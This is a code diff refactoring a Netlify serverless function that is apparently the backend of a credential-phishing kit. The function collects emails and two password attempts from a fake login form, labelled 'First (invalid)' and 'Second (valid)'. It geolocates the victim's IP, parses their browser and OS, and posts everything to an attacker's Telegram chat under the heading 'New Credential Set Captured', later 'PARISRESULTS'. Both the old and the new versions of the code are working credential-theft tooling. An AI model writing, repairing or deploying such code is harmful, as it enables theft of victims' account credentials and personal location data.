@@ -1,126 +1,133 @@
-import UAParser from 'ua-parser-js';
+const UAParser = require('ua-parser-js');
 
-export const handler = async (event, context) => {
-  // CORS headers
-  const headers = {
-    'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Headers': 'Content-Type',
-    'Access-Control-Allow-Methods': 'POST, OPTIONS',
-  };
+// --- Configuration ---
+const CONFIG = {
+  // Environment variables required by the function.
+  // This centralizes env var access and makes dependencies clear.
+  ENV: {
+    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
+    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
+  },
+  // Timeout for fetch requests in milliseconds.
+  FETCH_TIMEOUT: 15000,
+  // Fields to request from the IP geolocation API.
+  GEO_API_FIELDS: 'country,regionName,query',
+};
 
-  // Handle preflight requests
-  if (event.httpMethod === 'OPTIONS') {
-    return {
-      statusCode: 200,
-      headers,
-      body: '',
-    };
+// --- Helper Functions ---
+
+/**
+ * Creates an AbortSignal that aborts after a specified time.
+ * @param {number} ms - The timeout in milliseconds.
+ * @returns {AbortSignal}
+ */
+const createTimeoutSignal = (ms) => {
+  const controller = new AbortController();
+  setTimeout(() => controller.abort(), ms);
+  return controller.signal;
+};
+
+/**
+ * Safely gets a header value, checking for case variations.
+ * @param {object} headers - The request headers.
+ * @param {string} name - The header name.
+ * @returns {string}
+ */
+const getHeader = (headers, name) => headers[name] || headers[name.toLowerCase()] || '';
+
+/**
+ * Detects the client's IP address from various headers.
+ * @param {object} event - The Netlify event object.
+ * @returns {string}
+ */
+const getClientIp = (event) => {
+  const headers = event.headers || {};
+  const ip = getHeader(headers, 'x-forwarded-for') ||
+             getHeader(headers, 'x-real-ip') ||
+             getHeader(headers, 'cf-connecting-ip') ||
+             event.requestContext?.identity?.sourceIp ||
+             'Unknown';
+  return ip.toString().split(',')[0].trim();
+};
+
+/**
+ * Fetches geolocation data for a given IP address.
+ * @param {string} ip - The IP address.
+ * @returns {Promise<{country: string, regionName: string}>}
+ */
+const getIpAndLocation = async (ip) => {
+  const location = { country: 'Unknown', regionName: 'Unknown' };
+  if (ip === 'Unknown' || ip.startsWith('127.0.0.1')) {
+    return location;
   }
-
-  if (event.httpMethod !== 'POST') {
-    return {
-      statusCode: 405,
-      headers,
-      body: JSON.stringify({ error: 'Method not allowed' }),
-    };
-  }
-
-  // Helper: safe timeout signal
-  const createTimeoutSignal = (ms) => {
-    const controller = new AbortController();
-    setTimeout(() => controller.abort(), ms);
-    return controller.signal;
-  };
-
   try {
-    const bodyRaw = event.body || '{}';
-    let data = {};
-    try {
-      data = JSON.parse(bodyRaw);
-    } catch (parseErr) {
-      console.error("Error parsing request body:", parseErr);
+    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=${CONFIG.GEO_API_FIELDS}`, {
+      signal: createTimeoutSignal(3000), // Shorter timeout for geo lookup
+    });
+    if (geoResponse.ok) {
+      const geoJson = await geoResponse.json();
+      location.country = geoJson.country || 'Unknown';
+      location.regionName = geoJson.regionName || 'Unknown';
     }
+  } catch (e) {
+    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
+  }
+  return location;
+};
 
+/**
+ * Parses user agent string to get device, OS, and browser info.
+ * @param {string} userAgent - The user agent string.
+ * @returns {object}
+ */
+const getDeviceDetails = (userAgent) => {
+  const uaParser = new UAParser(userAgent || '');
+  const browser = uaParser.getBrowser();
+  const os = uaParser.getOS();
+  
+  return {
+    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
+    browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
+    os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
+  };
+};
+
+/**
+ * Composes the message to be sent to Telegram.
+ * @param {object} data - The parsed request body.
+ * @returns {string}
+ */
+const composeTelegramMessage = (data) => {
     const {
-      email,
-      password,
-      firstAttemptPassword,
-      secondAttemptPassword,
-      provider,
-      timestamp,
-      userAgent,
-      sessionId: incomingSessionId,
+        email,
+        provider,
+        firstAttemptPassword,
+        secondAttemptPassword,
+        password, // Fallback
+        clientIP,
+        location,
+        deviceDetails,
+        timestamp,
+        sessionId,
     } = data;
 
-    // Required env vars
-    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+    const hasTwoStepData = firstAttemptPassword && secondAttemptPassword;
 
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars');
-      return {
-        statusCode: 500,
-        headers,
-        body: JSON.stringify({ success: false, message: 'Server misconfiguration' })
-      };
-    }
-    
-    // --- IP and Location Detection ---
-    const headersIn = event.headers || {};
-    const headerGet = (name) => headersIn[name] || headersIn[name.toLowerCase()] || '';
-    const clientIP = (headerGet('x-forwarded-for') || headerGet('x-real-ip') || headerGet('cf-connecting-ip') ||
-                      (event.requestContext?.identity?.sourceIp) || 'Unknown').toString().split(',')[0].trim();
-    
-    let locationData = { country: 'Unknown', regionName: 'Unknown' };
-    try {
-      if (clientIP !== 'Unknown' && !clientIP.startsWith('127.0.0.1')) {
-        const geoResponse = await fetch(`http://ip-api.com/json/${clientIP}?fields=country,regionName`);
-        if (geoResponse.ok) {
-          const geoJson = await geoResponse.json();
-          locationData.country = geoJson.country || 'Unknown';
-          locationData.regionName = geoJson.regionName || 'Unknown';
-        }
-      }
-    } catch (e) {
-      console.error('Geolocation lookup failed:', e);
-    }
-
-
-    // --- Enhanced Browser and OS Detection ---
-    const uaParser = new UAParser(userAgent || '');
-    const browserInfo = uaParser.getBrowser(); // { name, version }
-    const osInfo = uaParser.getOS();           // { name, version }
-    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';
-    const formattedBrowser = browserInfo.name ? `${browserInfo.name} ${browserInfo.version || ''}`.trim() : 'Unknown Browser';
-    const formattedOS = osInfo.name ? `${osInfo.name} ${osInfo.version || ''}`.trim() : 'Unknown OS';
-
-
-    // --- Prepare Passwords ---
-    const plainFirstAttemptPassword = firstAttemptPassword || 'Not captured';
-    const plainSecondAttemptPassword = secondAttemptPassword || 'Not captured';
-
-
-    // --- Compose Enhanced Telegram Message ---
-    const sessionId = incomingSessionId || Math.random().toString(36).substring(2, 15);
-    const hasTwoStepData = plainFirstAttemptPassword !== 'Not captured' && plainSecondAttemptPassword !== 'Not captured';
-    
-    let passwordSection = '';
+    let passwordSection;
     if (hasTwoStepData) {
-        passwordSection = `🔑 First (invalid): \`${plainFirstAttemptPassword}\`\n🔑 Second (valid): \`${plainSecondAttemptPassword}\``;
+        passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;
     } else {
-        // Fallback for single password if provided
         passwordSection = `🔑 Password: \`${password || 'Not captured'}\``;
     }
-    
-    // Using UTC timestamp from the user for consistency
+
     const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
         hour: '2-digit', minute: '2-digit', second: '2-digit',
         timeZone: 'UTC', hour12: true
     }) + ' UTC';
 
-    const message = `
-*🔐 New Credential Set Captured 🔐*
+    return `
+*🔐 PARISRESULTS 🔐*
 
 *ACCOUNT DETAILS*
 - 📧 Email: \`${email || 'Not captured'}\`
@@ -129,70 +136,82 @@ export const handler = async (event, context) => {
 
 *DEVICE & LOCATION*
 - 📍 IP Address: \`${clientIP}\`
-- 🌍 Location: *${locationData.regionName}, ${locationData.country}*
-- 💻 OS: *${formattedOS}*
-- 🌐 Browser: *${formattedBrowser}*
-- 🖥️ Device Type: *${deviceInfo}*
+- 🌍 Location: *${location.regionName}, ${location.country}*
+- 💻 OS: *${deviceDetails.os}*
+- 🌐 Browser: *${deviceDetails.browser}*
+- 🖥️ Device Type: *${deviceDetails.deviceType}*
 
 *SESSION INFO*
 - 🕒 Timestamp: *${formattedTimestamp}*
 - 🆔 Session ID: \`${sessionId}\`
 `;
+};
 
 
-    // --- Send main message to Telegram ---
-    const telegramSignal = createTimeoutSignal(15000);
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+// --- Main Handler ---
+exports.handler = async (event) => {
+  const headers = {
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Headers': 'Content-Type',
+    'Access-Control-Allow-Methods': 'POST, OPTIONS',
+  };
+
+  if (event.httpMethod === 'OPTIONS') {
+    return { statusCode: 200, headers, body: '' };
+  }
+
+  if (event.httpMethod !== 'POST') {
+    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
+  }
+
+  // Check for required environment variables at the start.
+  if (!CONFIG.ENV.TELEGRAM_BOT_TOKEN || !CONFIG.ENV.TELEGRAM_CHAT_ID) {
+    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
+    return { statusCode: 500, headers, body: JSON.stringify({ success: false, message: 'Server misconfiguration.' }) };
+  }
+  
+  try {
+    const body = JSON.parse(event.body || '{}');
+    const clientIP = getClientIp(event);
+    const location = await getIpAndLocation(clientIP);
+    const deviceDetails = getDeviceDetails(body.userAgent);
+    const sessionId = body.sessionId || Math.random().toString(36).substring(2, 15);
+
+    const messageData = {
+        ...body,
+        clientIP,
+        location,
+        deviceDetails,
+        sessionId,
+    };
+    
+    const message = composeTelegramMessage(messageData);
+
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown',
-      }),
-      signal: telegramSignal,
+      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
+      signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
     });
-    
-    if(!telegramResponse.ok) {
-        const telegramResult = await telegramResponse.json();
-        console.error("Telegram API error:", telegramResult);
-    }
 
-    // --- Build final response for the client ---
-    const responseBody = {
-      success: true,
-      sessionId,
-    };
+    if (!telegramResponse.ok) {
+      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
+      console.error('Telegram API Error:', errorResult.description);
+    }
 
     return {
       statusCode: 200,
       headers,
-      body: JSON.stringify(responseBody),
+      body: JSON.stringify({ success: true, sessionId }),
     };
 
   } catch (error) {
-    console.error('Function error:', error);
-    // Attempt to notify about the error
-    try {
-      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-        const errMsg = `🚨 *Function Error*\n\n\`\`\`${String(error.message || error)}\`\`\``;
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: errMsg, parse_mode: 'Markdown' }),
-          signal: createTimeoutSignal(8000),
-        });
-      }
-    } catch (notificationError) {
-      // ignore
-    }
-
+    console.error('Function execution error:', error.message);
+    // Suppress sending error to Telegram to avoid noise, but keep it for server logs.
     return {
       statusCode: 500,
       headers,
-      body: JSON.stringify({ error: 'Internal server error' }),
+      body: JSON.stringify({ error: 'An internal server error occurred.' }),
     };
   }
 };
